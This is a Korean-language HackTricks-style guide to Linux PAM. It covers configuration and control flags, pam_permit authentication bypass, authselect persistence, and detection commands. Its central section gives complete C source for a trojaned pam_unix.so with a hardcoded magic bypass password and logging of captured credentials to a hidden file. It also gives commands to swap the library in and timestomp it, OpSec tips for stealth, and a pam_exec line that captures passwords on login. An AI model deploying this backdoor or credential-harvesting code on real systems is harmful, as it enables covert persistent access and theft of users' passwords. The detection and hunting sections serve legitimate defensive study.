# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 기본 정보

**PAM(Pluggable Authentication Modules)**은 **컴퓨터 서비스에 접근하려는 사용자의 신원을 확인**하고, 다양한 기준에 따라 접근을 제어하는 보안 메커니즘입니다. 디지털 문지기와 비슷한 역할을 하며, 권한이 있는 사용자만 특정 서비스를 이용할 수 있도록 하고 시스템 과부하를 방지하기 위해 사용량을 제한할 수도 있습니다.

#### 구성 파일

- **Solaris**는 기존 중앙 구성 파일인 `/etc/pam.conf`를 지원하지만, 현재는 `/etc/pam.d` 아래의 서비스별 파일을 사용하는 것이 권장됩니다.<sup>[[10]](#references)</sup>
- **Linux 시스템**은 디렉터리 방식을 선호하며, `/etc/pam.d`에 서비스별 구성을 저장합니다. 예를 들어 login 서비스의 구성 파일은 `/etc/pam.d/login`에 있습니다.<sup>[[1]](#references)</sup>

login 서비스의 PAM 구성 예시는 다음과 같습니다.

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM 관리 영역**

이 영역 또는 관리 그룹에는 **auth**, **account**, **password**, **session**이 있으며, 각각 인증 및 세션 관리 과정의 서로 다른 측면을 담당합니다:<sup>[[1]](#references)</sup>

- **Auth**: 사용자 신원을 검증하며, 보통 비밀번호를 입력하도록 요청합니다.
- **Account**: 그룹 멤버십이나 시간대 제한 등의 조건을 확인하여 계정을 검증합니다.
- **Password**: 복잡성 검사나 dictionary attacks 방지 등을 포함해 비밀번호 업데이트를 관리합니다.
- **Session**: 디렉터리 마운트나 리소스 제한 설정 등 서비스 세션의 시작 또는 종료 시 수행할 작업을 관리합니다.

#### **PAM 모듈 제어 플래그**

제어 플래그는 성공 또는 실패에 대한 모듈의 응답을 지정하며, 전체 인증 과정에 영향을 미칩니다. 다음과 같은 플래그가 있습니다:<sup>[[1]](#references)</sup>

- **Required**: required 모듈이 실패하면 최종적으로 실패하지만, 그 전에 이후 모듈을 모두 검사합니다.
- **Requisite**: 실패하면 즉시 처리를 종료합니다.
- **Sufficient**: 앞서 실행된 `required` 모듈이 실패하지 않았다면, 성공 시 즉시 반환하고 같은 관리 그룹의 나머지 모듈을 건너뜁니다.
- **Optional**: 스택에 해당 모듈만 있는 경우에만 실패를 유발합니다.

#### 중요한 공격 관점의 의미

PAM을 분석하거나 수정할 때는 삽입한 규칙의 **위치**에 따라 어떤 스택에 적용되는지가 결정됩니다:<sup>[[1]](#references)[[13]](#references)</sup>

- `include`와 `substack`은 다른 파일의 규칙을 불러옵니다. 따라서 `sshd`를 수정하면 SSH에만 영향을 줄 수 있지만, `system-auth`, `common-auth` 또는 다른 공유 스택을 수정하면 여러 서비스에 한 번에 영향을 줄 수 있습니다.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM은 `[success=1 default=ignore]` 같은 대괄호 제어 플래그도 지원합니다. 이를 악용하면 `pam_unix.so`를 눈에 띄게 교체하지 않고도 사용자 지정 검사가 성공한 뒤 모듈을 하나 이상 **건너뛸 수 있습니다**.<sup>[[1]](#references)</sup>
- `module-path`는 **절대 경로**(`/usr/lib/security/pam_custom.so`)이거나 기본 PAM 모듈 디렉터리 기준의 **상대 경로**일 수 있습니다. 최신 Linux 시스템의 실제 디렉터리는 `/lib/security`, `/lib64/security`, `/usr/lib/security` 또는 `/usr/lib/x86_64-linux-gnu/security` 같은 multiarch 경로인 경우가 많습니다.<sup>[[1]](#references)[[14]](#references)</sup>

운영 시 핵심 사항: 패치하기 전에 항상 **전체 서비스 그래프**를 파악하세요. 예를 들어 일부 배포판에서는 `sshd -> password-auth -> system-auth`, 다른 배포판에서는 `sshd -> system-remote-login -> system-login -> system-auth`로 이어집니다. 따라서 같은 한 줄짜리 implant가 의도보다 훨씬 많은 서비스에 영향을 줄 수 있습니다.<sup>[[1]](#references)[[13]](#references)</sup>

사용자 지정 `auth` 모듈은 계정 비밀번호를 입력한 뒤 `sudo`에 대화형 인증 절차를 추가할 수 있습니다. 인증 절차를 직접 검토하기 전에 실제로 적용되는 `/etc/pam.d/sudo` 스택, 포함된 정책, 모듈 인자, 참조하는 로컬 데이터 파일의 권한을 확인하세요. 읽을 수 있는 challenge 단어 목록만으로는 비밀번호 검사를 우회하거나 sudoers 권한을 만들 수 없습니다. 권한 전환에는 여전히 올바른 계정 인증, 모든 필수 PAM 단계의 완료, root 권한으로 실행할 수 있는 sudo 규칙이 필요합니다. 무인 열거로는 challenge가 실행되지 않아야 합니다.

레거시 Ubuntu [`pam_motd` 소유권 취약점 (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832)의 경우, 실제 `libpam-modules` 빌드와 로그인 서비스가 취약한 session 모듈을 호출하는지 확인하세요. Ubuntu는 9.10에서 **1.1.0-2ubuntu1.1**, 10.04 LTS에서 **1.1.1-2ubuntu5**로 이 문제를 수정했습니다. 다른 릴리스나 vendor backport는 각각 별도로 패키지를 평가해야 합니다. 보고된 경로에서는 호출자가 홈 디렉터리의 `.cache`를 symlink로 바꾼 다음 PAM 로그인을 유발해야 했으며, 이로 인해 이전 모듈이 보호 대상의 소유권을 변경했습니다. `.cache` 항목, `pam_motd.so` 행 또는 오래된 kernel 버전만으로는 취약성이 입증되지 않습니다. 파일을 교체하거나 로그인 절차를 시작하지 말고, 수동 열거 과정에서 홈 디렉터리 제어 권한, 실제 적용되는 모듈 버전, 로그인 가능 여부, symlink 처리 방식, 대상 권한을 확인하세요. [Ubuntu의 보안 공지](https://ubuntu.com/security/notices/USN-959-1)를 참조하세요.

#### 예시 시나리오

여러 auth 모듈을 사용하는 설정에서는 엄격한 순서에 따라 처리됩니다. `pam_securetty` 모듈이 로그인 터미널을 허용되지 않은 것으로 판단하면 root 로그인이 차단되지만, 해당 모듈의 "required" 상태 때문에 나머지 모듈도 모두 처리됩니다. `pam_env`는 환경 변수를 설정하여 사용자 경험을 개선할 수 있습니다. `pam_ldap`와 `pam_unix` 모듈은 함께 사용자를 인증하며, `pam_unix`는 앞서 제공된 비밀번호를 사용하려고 시도합니다. 이로써 인증 방식의 효율성과 유연성이 높아집니다.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## 서비스 스택의 `pam_permit`

`pam_permit.so`는 PAM 검사에서 성공을 반환합니다. 권한이 낮은 사용자가 서비스에 실제로 적용되는 PAM 정책을 수정할 수 있다면, 인증 스택을 조기에 종료하는 제어 플래그와 함께 이 모듈을 삽입하여 해당 서비스의 비밀번호 검사를 제거할 수 있습니다. `sudo`의 경우 어떤 서비스가 영향을 받는지 판단하기 전에 `/etc/pam.d/sudo`와 여기에 포함된 `common-auth` 또는 `system-auth` 파일을 확인하세요. PAM 인증 우회로 새로운 sudoers 규칙이 부여되지는 않습니다. 사용자는 여전히 요청한 명령을 실행할 권한이 있어야 합니다. 단일 `sufficient pam_permit.so` 행이 항상 성공한다고 가정하지 말고 규칙 순서와 앞선 `required` 실패 여부를 확인하세요.

## PAM 백도어 설치 – `pam_unix.so` 후킹

중요한 Linux 환경에서 흔히 사용하는 persistence 기법은 **정상 PAM 라이브러리를 트로이 목마가 삽입된 대체 라이브러리로 교체하는 것**입니다. PAM 스택이 `pam_unix.so`를 로드하는 호스트에서는 SSH 또는 콘솔 인증 시 `pam_sm_authenticate()` 진입점이 호출될 수 있습니다. 악성 대체 라이브러리는 자격 증명을 캡처하거나 *magic* 비밀번호 우회를 구현할 수 있습니다.<sup>[[2]](#references)[[11]](#references)</sup>

### 컴파일 요약
아래 예시는 Linux-PAM의 `pam_sm_authenticate()` 서비스 진입점과 `pam_get_authtok()`을 사용해 인증 토큰에 접근합니다.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>예시 `pam_unix.so` 트로이 목마</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

컴파일한 뒤 은밀하게 교체합니다(교체/timestomp 패턴은 Unit 42에 문서화되어 있습니다). wrapper에 하드코딩된 백업 경로와 아래 명령의 경로를 대상 시스템의 실제 PAM 모듈 디렉터리에 맞게 조정하세요:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec 팁
1. **원자적 덮어쓰기** – 완성된 라이브러리를 임시 파일에 쓴 다음 제자리로 이름을 변경해, 인증 모듈이 부분적으로 기록된 상태로 남지 않게 합니다.
2. Unit 42의 AuthDoor 분석에서 `/usr/bin/.dbus.log`와 같은 경로가 관찰되었으므로, 유용한 hunting indicator이기도 합니다.<sup>[[2]](#references)</sup>
3. PAM stack이 예상하는 entry point(예: `pam_sm_authenticate` 및 `pam_sm_setcred`)를 유지해 다른 관리 작업이 계속 작동하도록 합니다.<sup>[[11]](#references)[[18]](#references)</sup>

### 탐지
패키지 무결성 검사에서 RPM은 설치된 파일의 메타데이터를 확인하고, `debsums -s`는 체크섬 오류를 보고하며, 분류 블록의 `dpkg -S`는 패키지 소유권을 조회합니다. audit watch 구문은 경로에 대한 쓰기 및 속성 변경을 기록합니다.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so`의 MD5/SHA256을 배포판 패키지와 비교합니다.
* 수동으로 해시를 계산하지 않고 교체된 라이브러리를 찾으려면 `rpm -V pam` 또는 `debsums -s libpam-modules`를 실행합니다.
* `/lib/security/` 아래에서 누구나 쓸 수 있는 파일이나 비정상적인 소유권을 확인합니다.
* `auditd` 규칙: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* 예상치 못한 모듈이 있는지 PAM 설정을 grep합니다: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

이 `pam_` grep은 다른 `.so` 기본 이름을 사용하는 커스텀 모듈을 놓칩니다. `/etc/pam.d`의 **활성화된** `auth`, `account`, `password`, `session` 행과, 사용되는 경우 `/etc/pam.conf`의 행도 검토합니다. 여기에는 control flag와 포함된 stack도 확인해야 합니다. 일반 비밀번호 검사보다 앞에 `auth sufficient`로 배치된 낯선 모듈은 패키지 소유권과 바이너리를 검토할 만합니다. [PAM의 control 구문](https://man7.org/linux/man-pages/man5/pam.d.5.html)은 성공 시 stack의 해당 부분을 조기에 종료할 수 있습니다. 모듈 이름, 비정상적인 타임스탬프 또는 `nodelay` 옵션만으로는 우회가 입증되지 않습니다. 동작이 timing leak을 시사한다면 먼저 구현과 서비스 접근 가능성을 확인하세요. 일상적인 열거 과정에서 인증 정보를 반복해서 추측 입력해서는 안 됩니다.

### 빠른 초기 분류 명령(침해 후 또는 위협 헌팅 시)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### 지속성을 위해 `pam_exec` 악용하기
`pam_unix.so`를 대체하는 대신, `/etc/pam.d/sshd`에 `pam_exec` 행을 추가하는 덜 침습적인 방법을 사용할 수 있습니다. 그러면 해당 PAM 행까지 도달하는 호출이 일반 스택을 그대로 유지하면서 헬퍼를 실행합니다.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec`는 `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, `PAM_TYPE` 같은 환경 변수로 PAM 메타데이터를 받습니다. `expose_authtok`를 사용하면 helper는 `auth` 또는 `password` 단계에서 `stdin`으로 비밀번호를 최대 `PAM_MAX_RESP_SIZE`바이트까지 읽을 수 있습니다. helper를 real UID 대신 effective UID로 실행하려면 `seteuid`를 추가하세요.<sup>[[4]](#references)</sup>

실용적인 참고 사항은 `pam_exec`에 문서화된 모듈 유형 및 `type=` 필터를 따릅니다:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...`는 소켓을 다시 열거나 분리된 daemon을 생성하는 등의 **로그인 후 작업**에 더 적합합니다.
- `auth optional pam_exec.so quiet expose_authtok ...`는 세션이 열리기 전에 실행되므로 **자격 증명 수집**에 일반적으로 사용됩니다.
- `type=session` 또는 `type=auth`를 사용하면 특정 PAM 단계로 실행을 제한해 불필요한 중복 실행을 방지할 수 있습니다.

권한 검토 시 현재 사용자가 쓸 수 있는 절대 경로의 `pam_exec.so` helper는 파일에 append-only 표시(`a`)가 있더라도 점검 대상입니다. [해당 속성은 데이터 추가를 허용하며](https://man7.org/linux/man-pages/man1/chattr.1.html), 이것만으로도 셸 스크립트의 이후 동작을 바꾸기에 충분할 수 있습니다. 먼저 PAM 서비스와 이벤트가 실제로 해당 줄까지 도달하는지, helper와 상위 경로를 신뢰할 수 있는지, 그리고 명령이 더 높은 권한의 ID로 실행되는지 확인하세요. [`seteuid`는 어떤 PAM UID를 사용할지 변경합니다](https://man7.org/linux/man-pages/man8/pam_exec.8.html). 파일을 쓸 수 있거나 `lsattr` 결과가 있다는 사실만으로는 권한 상승 실행이 입증되지 않습니다.

### 배포판 도구 업데이트 후에도 유지하기: `authselect`

`authselect`를 사용하는 RHEL 및 Fedora 계열 시스템에서는 `/etc/pam.d/system-auth` 또는 `/etc/pam.d/password-auth` 같은 생성된 파일을 직접 수정해도 **`authselect`가 덮어쓸 수 있습니다**. 변경 사항을 유지하려면 운영자는 보통 `/etc/authselect/custom/<profile>/`의 활성 사용자 지정 프로필을 수정한 다음 다시 선택합니다.<sup>[[5]](#references)[[19]](#references)</sup>

root 권한이 있을 때의 일반적인 작업 흐름:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

이 내용은 공격과 초기 분류 모두에 중요합니다. `/etc/pam.d/system-auth`에 `Generated by authselect` 및 `Do not modify this file manually` 배너가 있다면, 실제 지속성 지점은 `/etc/pam.d/`가 아니라 `/etc/authselect/custom/` 아래에 있을 수 있습니다.<sup>[[5]](#references)</sup>

### 실제 환경에서 최근 관찰된 수법

2025년 Plague Linux 백도어에 대한 최신 보고에서는 같은 핵심 아이디어를 한 단계 더 발전시킨 사례를 보여줍니다. **static bypass password**가 포함된 악성 PAM 구성 요소에 더해, 로그인 후 세션 흔적을 줄이기 위해 SSH 관련 환경 변수와 셸 기록(`HISTFILE=/dev/null`)을 정리합니다.<sup>[[3]](#references)</sup> 백도어 로직은 PAM에 있을 수 있지만 은폐 흔적은 인증 성공 **후에만** 나타날 수 있으므로, 이는 유용한 헌팅 패턴입니다.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM 설명서](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [은밀한 운영자의 플레이북: 글로벌 통신망 침투 - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: 새롭게 발견된 Linux용 PAM 기반 백도어](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM 설명서](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselect를 사용한 사용자 인증 구성 - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian 매뉴얼 페이지](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian 매뉴얼 페이지](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4에서 인증 관리](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM 설명서](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM 설명서](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [시스템 수준 인증 안내서 - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu 패키지 파일 목록: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM 설명서](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM 설명서](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian 매뉴얼 페이지](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM 설명서](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [변경 사항/Authselect 필수화 - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
